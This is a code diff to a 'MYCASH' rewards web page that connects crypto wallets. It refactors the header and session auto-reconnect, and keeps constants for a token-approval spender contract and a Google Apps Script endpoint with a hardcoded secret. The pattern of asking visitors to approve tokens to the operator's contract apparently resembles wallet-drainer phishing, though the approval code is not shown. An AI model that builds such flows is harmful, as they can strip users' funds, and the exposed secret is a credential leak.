@@ -25,23 +25,24 @@
     .small { font-size:0.9rem; color:#9fb0c8; }
     .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Helvetica Neue", monospace; }
   </style>
-<header>
-  <div class="nav">
-    <div class="nav-left">
-      <a href="index.html">Home</a>
-      <a href="about.html">About</a>
-      <a href="contact.html">Contact</a>
-      <a href="rewards.html">Rewards</a>
+</head>
+<body>
+
+  <header>
+    <div class="nav">
+      <div class="nav-left">
+        <a href="index.html">Home</a>
+        <a href="about.html">About</a>
+        <a href="contact.html">Contact</a>
+        <a href="reward.html">Rewards</a>
+      </div>
+
+      <div class="logo">MYCASH</div>
+
+      <div>
+        <button id="connectBtn" class="connect">Connect Wallet</button>
+      </div>
     </div>
-
-    <div class="logo">MYCASH</div>
-
-    <div>
-      <button id="connectBtn" class="connect">Connect Wallet</button>
-    </div>
-  </div>
-</header>
-
   </header>
 
   <main>
@@ -99,9 +100,6 @@
     const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbzlCsXUoqaMW4fCTqK6H_SF7dGCDDkcIoO-To5YbLcBLdWEEKvGjHQm_vSUfwE06Yw/exec";
     const APPS_SCRIPT_SECRET = "mahfuzinam0045";
 
-    // 🔥 IMPORTANT:
-    // 1) TOKEN_ADDRESS MUST be a BEP-20 TOKEN CONTRACT, not your wallet.
-    // 2) SPENDER_ADDRESS is your smart contract that will be approved.
     const TOKEN_ADDRESS   = "PUT_YOUR_BEP20_TOKEN_CONTRACT_ADDRESS_HERE"; // <--- CHANGE THIS
     const SPENDER_ADDRESS = "0xD0A66d72B69c850b04Eb9CEA6cA156A412d2306d"; // your smart contract
 
@@ -421,75 +419,37 @@
         alert("Connection failed: " + (err && err.message ? err.message : err));
       }
     }
-async function tryAutoReconnect(){
-  try {
 
-    if (!web3ModalInstance) {
-      initWeb3ModalInstance();
-    }
+    async function tryAutoReconnect(){
+      try{
+        if(!web3ModalInstance) initWeb3ModalInstance();
 
-    const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-
-    // 1) TRUST WALLET (desktop extension or mobile in-app browser)
-    if (!mobile && window.trustwallet && window.trustwallet.ethereum) {
-      const injected = window.trustwallet.ethereum;
-
-      providerInstance = injected;
-      web3Instance     = new Web3(providerInstance);
-      attachProviderListeners(providerInstance);
-
-      const accounts = await injected.request({ method: "eth_accounts" });
-
-      if (accounts && accounts.length > 0) {
-        const address = accounts[0].toLowerCase();
-
-        setStatus("Restoring session (Trust Wallet)...");
-        const balanceWei = await web3Instance.eth.getBalance(address);
-        const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei, "ether"));
-        const userId     = getOrCreateUserIdFor(address);
-
-        setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
-        setUserIdUI(userId);
-
-        if (tokensContainer) {
-          tokensContainer.textContent = "Connect again to approve token or claim.";
+        if(window.ethereum){
+          const injected = window.ethereum;
+          const accounts = await injected.request({ method: "eth_accounts" });
+          if(accounts && accounts.length){
+            providerInstance = injected;
+            web3Instance     = new Web3(providerInstance);
+            attachProviderListeners(providerInstance);
+            const address    = accounts[0].toLowerCase();
+            setStatus("Restoring session…");
+            const balanceWei = await web3Instance.eth.getBalance(address);
+            const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei+"","ether"));
+            const userId     = getOrCreateUserIdFor(address);
+            setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
+            setUserIdUI(userId);
+            tokensContainer.innerHTML = '<div class="muted">Connect again to approve token.</div>';
+            setStatus("Connected (restored)");
+            return;
+          }
         }
 
-        setStatus("Connected (restored)");
-        return;
+        clearSessionUI();
+      }catch(err){
+        console.warn("Auto-reconnect error:", err);
+        clearSessionUI();
       }
     }
-
-    // 2) STANDARD INJECTED PROVIDER (MetaMask, Brave, etc.)
-    if (window.ethereum) {
-      const injected = window.ethereum;
-
-      providerInstance = injected;
-      web3Instance     = new Web3(providerInstance);
-      attachProviderListeners(providerInstance);
-
-      const accounts = await injected.request({ method: "eth_accounts" });
-
-      if (accounts && accounts.length > 0) {
-        const address = accounts[0].toLowerCase();
-
-        setStatus("Restoring session…");
-        const balanceWei = await web3Instance.eth.getBalance(address);
-        const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei, "ether"));
-        const userId     = getOrCreateUserIdFor(address);
-
-        setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
-        setUserIdUI(userId);
-
-        if (tokensContainer) {
-          tokensContainer.textContent = "Connect again to approve token or claim.";
-        }
-
-        setStatus("Connected (restored)");
-        return;
-      }
-    }
-
 
     document.addEventListener("DOMContentLoaded", async function(){
       initWeb3ModalInstance();
